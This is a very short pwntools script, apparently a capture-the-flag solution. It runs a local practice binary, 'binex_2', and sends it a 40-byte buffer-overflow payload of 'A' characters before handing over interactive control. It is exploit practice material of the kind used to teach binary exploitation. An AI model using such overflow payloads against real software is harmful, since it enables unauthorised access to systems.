from pwn import *

io = process('./binex_2')

payload = b'A'*40

io.sendline(payload)
io.interactive()